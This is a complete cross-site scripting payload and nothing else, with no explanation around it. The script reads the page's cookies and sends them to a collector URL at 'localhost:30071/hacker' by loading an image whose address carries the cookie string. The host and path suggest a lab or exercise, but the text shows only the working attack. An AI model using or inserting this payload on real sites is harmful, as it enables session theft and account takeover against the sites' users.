<script>
  var cookie = document.cookie;
  var image = document.createElement('img');
  image.src= "http://localhost:30071/hacker?cookie=" + cookie;
  document.getElementsByTagName("body")[0].appendChild(image);
</script>